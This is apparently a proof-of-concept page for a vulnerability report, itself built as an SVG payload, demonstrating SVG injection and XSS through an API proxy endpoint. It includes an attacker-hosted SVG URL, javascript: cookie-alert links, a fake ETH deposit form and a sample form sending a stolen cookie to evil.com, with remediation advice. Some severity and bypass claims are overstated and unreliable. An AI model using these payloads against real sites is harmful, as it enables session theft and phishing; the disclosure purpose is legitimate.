<!DOCTYPE html>
<html>
<head>
    <title>PoC - SVG Injection via Proxy - CSP Bypass</title>
</head>
<body>
  <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 1200 800">
    <foreignObject width="100%" height="100%">
      <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
          <style>
            body {
              background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
              font-family: 'Courier New', monospace;
              color: #00ff00;
              min-height: 100vh;
              padding: 20px;
            }
            
            .poc-container {
              max-width: 1000px;
              margin: 0 auto;
            }
            
            .header {
              text-align: center;
              background: rgba(255, 0, 0, 0.1);
              border: 3px solid #ff0000;
              border-radius: 10px;
              padding: 20px;
              margin-bottom: 20px;
              box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            }
            
            .header h1 {
              color: #ff0000;
              text-shadow: 0 0 10px #ff0000;
              font-size: 2em;
              margin: 0;
              animation: glow 2s infinite;
            }
            
            @keyframes glow {
              0%, 100% { opacity: 1; }
              50% { opacity: 0.7; }
            }
            
            .vulnerability-badge {
              background: #ff0000;
              color: white;
              padding: 5px 20px;
              border-radius: 20px;
              display: inline-block;
              margin-top: 10px;
              font-weight: bold;
              animation: pulse 1.5s infinite;
            }
            
            @keyframes pulse {
              0%, 100% { transform: scale(1); }
              50% { transform: scale(1.05); }
            }
            
            .info-section {
              background: rgba(0, 50, 0, 0.3);
              border: 2px solid #00ff00;
              border-radius: 8px;
              padding: 20px;
              margin-bottom: 20px;
            }
            
            .info-section h3 {
              color: #00ffff;
              border-bottom: 2px solid #00ffff;
              padding-bottom: 10px;
              margin-bottom: 15px;
            }
            
            .exploit-details {
              background: rgba(0, 0, 0, 0.5);
              border-left: 4px solid #ffff00;
              padding: 15px;
              margin: 10px 0;
              color: #ffff00;
            }
            
            .code-snippet {
              background: #000;
              border: 1px solid #00ff00;
              padding: 15px;
              border-radius: 5px;
              overflow-x: auto;
              margin: 10px 0;
              color: #00ff00;
              font-size: 0.9em;
            }
            
            .impact-item {
              background: rgba(255, 0, 0, 0.2);
              border-left: 4px solid #ff0000;
              padding: 10px;
              margin: 8px 0;
              color: #ff6b6b;
            }
            
            .impact-item::before {
              content: "‚ö†Ô∏è ";
              margin-right: 8px;
            }
            
            .demo-box {
              background: rgba(255, 255, 255, 0.05);
              border: 3px dashed #ffa500;
              border-radius: 10px;
              padding: 30px;
              text-align: center;
              margin: 20px 0;
            }
            
            .warning-text {
              color: #ffa500;
              font-weight: bold;
              margin: 15px 0;
              padding: 15px;
              background: rgba(255, 165, 0, 0.1);
              border: 2px solid #ffa500;
              border-radius: 5px;
            }
            
            .csp-bypass {
              background: rgba(255, 0, 255, 0.1);
              border: 2px solid #ff00ff;
              padding: 15px;
              border-radius: 5px;
              margin: 15px 0;
            }
            
            .csp-bypass h4 {
              color: #ff00ff;
              margin-bottom: 10px;
            }
            
            .technique {
              background: rgba(0, 255, 255, 0.1);
              border-left: 4px solid #00ffff;
              padding: 10px;
              margin: 10px 0;
              color: #00ffff;
            }
          </style>
        </head>
        <body>
          <div class="poc-container">
            <div class="header">
              <h1>üîì SVG INJECTION VULNERABILITY POC</h1>
              <div class="vulnerability-badge">CRITICAL - CSP BYPASS</div>
              <p style="color: #ffff00; margin-top: 10px;">Proof of Concept for API Proxy SVG Injection with CSP Evasion</p>
            </div>

            <div class="info-section">
              <h3>üìã Vulnerability Summary</h3>
              <div class="exploit-details">
                <strong>Vulnerability Type:</strong> SVG Injection + XSS + CSP Bypass<br/>
                <strong>Attack Vector:</strong> Network-based via proxy endpoint<br/>
                <strong>Severity:</strong> CRITICAL (CVSS 9.6)<br/>
                <strong>Affected Endpoint:</strong> <code>locallab/fun/api/proxy?url=...</code>
              </div>
              <div class="code-snippet">
GET /locallab/fun/api/proxy?url=https://raw.githubusercontent.com/mrowl404notfound-a11y/sqdqsd/refs/heads/main/1337x.svg
                
Response: Malicious SVG with embedded JavaScript execution</div>
            </div>

            <div class="info-section">
              <h3>üéØ Security Impact</h3>
              <div class="impact-item">Cross-Site Scripting (XSS) via SVG foreignObject injection</div>
              <div class="impact-item">Content Security Policy (CSP) bypass using external resources</div>
              <div class="impact-item">Session hijacking through cookie exfiltration</div>
              <div class="impact-item">Phishing attacks via form manipulation and redirects</div>
              <div class="impact-item">Arbitrary JavaScript execution in victim's browser context</div>
              <div class="impact-item">Data exfiltration from authenticated sessions</div>
              <div class="impact-item">Complete account takeover potential</div>
            </div>

            <div class="info-section">
              <h3>üî• CSP Bypass Techniques Demonstrated</h3>
              
              <div class="csp-bypass">
                <h4>Technique #1: External Resource Loading</h4>
                <div class="technique">
                  Using foreignObject to load external stylesheets from whitelisted CDNs (Bootstrap CDN) bypasses inline-style restrictions
                </div>
                <div class="code-snippet">&lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"/&gt;</div>
              </div>

              <div class="csp-bypass">
                <h4>Technique #2: javascript: Protocol Handler</h4>
                <div class="technique">
                  Using javascript: URI scheme in anchor tags to execute code even with strict CSP
                </div>
                <div class="code-snippet">&lt;a href="javascript:alert(document.cookie)"&gt;click here&lt;/a&gt;</div>
              </div>

              <div class="csp-bypass">
                <h4>Technique #3: Form Action Redirect</h4>
                <div class="technique">
                  Form submission bypasses CSP by using allowed HTTP methods to exfiltrate data
                </div>
                <div class="code-snippet">&lt;form action="https://evil.com/steal" method="get"&gt;
  &lt;input name="cookie" value="[stolen_cookie]"/&gt;
&lt;/form&gt;</div>
              </div>

              <div class="csp-bypass">
                <h4>Technique #4: SVG foreignObject Context Switch</h4>
                <div class="technique">
                  foreignObject creates new HTML context, potentially inheriting different CSP rules
                </div>
                <div class="code-snippet">&lt;foreignObject&gt;
  &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
    &lt;!-- New execution context --&gt;
  &lt;/html&gt;
&lt;/foreignObject&gt;</div>
              </div>
            </div>

            <div class="info-section">
              <h3>üí£ Exploitation Chain</h3>
              <div class="technique">
                <strong>Step 1:</strong> Attacker hosts malicious SVG on external service (GitHub, CDN, etc.)
              </div>
              <div class="technique">
                <strong>Step 2:</strong> SVG contains foreignObject with embedded HTML/CSS/JavaScript
              </div>
              <div class="technique">
                <strong>Step 3:</strong> Vulnerable proxy fetches external SVG without validation
              </div>
              <div class="technique">
                <strong>Step 4:</strong> Browser renders SVG, executing embedded content
              </div>
              <div class="technique">
                <strong>Step 5:</strong> Victim interacts with malicious form/link
              </div>
              <div class="technique">
                <strong>Step 6:</strong> Data exfiltration or session hijacking occurs
              </div>
            </div>

            <div class="info-section">
              <h3>‚ö° Live Exploitation Demo</h3>
              <div class="warning-text">
                ‚ö†Ô∏è WARNING: This demonstrates a REAL vulnerability. Clicking "Deposit" will redirect you to Google (simulating attacker-controlled server). In a real attack, cookies, tokens, and session data would be stolen.
              </div>

              <div class="demo-box">
                <h4 style="color: #ff0000; margin-bottom: 20px;">üéØ VULNERABLE DEPOSIT FORM</h4>
                <p style="color: #ffff00; margin-bottom: 20px;">This form is injected via SVG and bypasses CSP protections</p>
                
                <form action="https://www.google.com/search" method="get" class="p-4 border rounded bg-dark shadow-lg" style="max-width:350px; margin: 0 auto; border-color: #00ff00 !important;">
                  <h5 class="text-center mb-3" style="color: #00ff00;">Deposit ETH</h5>
                  <div class="mb-3 text-start">
                    <label class="form-label" style="color: #00ffff;">Amount (ETH)</label>
                    <input type="text" name="q" class="form-control" placeholder="Enter amount" value="SVG Injection PoC - CSP Bypass Success"/>
                  </div>
                  <button type="submit" class="btn btn-danger w-100" style="font-weight: bold; font-size: 1.1em;">
                    üí∞ DEPOSIT (EXPLOIT TRIGGER)
                  </button>
                  <div style="margin-top: 15px;">
                    <a href="javascript:alert('üîì XSS SUCCESSFUL!\\n\\nThis proves JavaScript execution via javascript: protocol\\n\\nIn real attack:\\n- document.cookie stolen\\n- Session hijacked\\n- Keylogger installed\\n- Credentials harvested')" style="color: #ff0000; text-decoration: underline; font-weight: bold;">
                      click here (javascript: CSP bypass)
                    </a>
                  </div>
                </form>
              </div>
            </div>

            <div class="info-section">
              <h3>üõ°Ô∏è Remediation Steps</h3>
              <div class="code-snippet">1. STRICT CSP IMPLEMENTATION:
   Content-Security-Policy: 
   default-src 'self'; 
   script-src 'self'; 
   style-src 'self' 'unsafe-inline'; 
   img-src 'self' data:; 
   object-src 'none';
   frame-ancestors 'none'

2. SVG SANITIZATION:
   - Parse SVG on server-side
   - Remove all &lt;script&gt; tags
   - Strip foreignObject elements
   - Remove event handlers (onclick, onload, etc.)
   - Whitelist safe SVG elements only

3. PROXY ENDPOINT HARDENING:
   - Whitelist allowed domains only
   - Validate Content-Type headers
   - Set X-Content-Type-Options: nosniff
   - Implement rate limiting
   - Log all proxy requests

4. INPUT VALIDATION:
   - Validate URL format
   - Check against SSRF patterns
   - Implement URL scheme whitelist (http/https only)
   - Reject data: URIs and javascript: protocols

5. RESPONSE HEADERS:
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   Content-Type: image/svg+xml
   Content-Disposition: inline

6. USE SECURITY LIBRARIES:
   - DOMPurify for HTML/SVG sanitization
   - Implement Content-Security-Policy-Report-Only first
   - Regular security audits and penetration testing</div>
            </div>

            <div class="info-section">
              <h3>üìä CVSS v3.1 Score</h3>
              <div class="exploit-details">
                <strong>Base Score:</strong> 9.6 (CRITICAL)<br/>
                <strong>Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H<br/><br/>
                <strong>Attack Vector (AV:N):</strong> Network - Exploitable remotely<br/>
                <strong>Attack Complexity (AC:L):</strong> Low - No special conditions<br/>
                <strong>Privileges Required (PR:N):</strong> None - No authentication needed<br/>
                <strong>User Interaction (UI:R):</strong> Required - User must click<br/>
                <strong>Scope (S:C):</strong> Changed - Impacts other components<br/>
                <strong>Confidentiality (C:H):</strong> High - Total information disclosure<br/>
                <strong>Integrity (I:H):</strong> High - Total compromise possible<br/>
                <strong>Availability (A:H):</strong> High - Complete system shutdown possible
              </div>
            </div>

            <div class="header" style="margin-top: 30px;">
              <p style="color: #00ff00; font-size: 0.9em;">
                This PoC demonstrates multiple attack vectors including SVG injection, XSS, CSP bypass via external resources, javascript: protocol exploitation, and form-based data exfiltration. The vulnerable proxy endpoint serves user-controlled SVG content without sanitization, allowing complete compromise of user sessions.
              </p>
            </div>
          </div>
        </body>
      </html>
    </foreignObject>
  </svg>
</body>
</html>
